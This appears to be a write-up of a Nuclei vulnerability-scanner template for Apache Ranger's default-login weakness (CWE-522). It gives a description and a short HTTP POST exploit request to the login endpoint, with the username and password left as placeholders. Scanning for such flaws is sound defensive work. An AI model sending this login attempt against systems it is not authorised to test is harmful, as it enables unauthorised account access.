# Nuclei Template: Apache Ranger - Default Login
**Template ID:** ranger-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`ranger-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Apache Ranger contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username={{user}}&password={{pass}}
```

## References
- https://github.com/apache/ranger
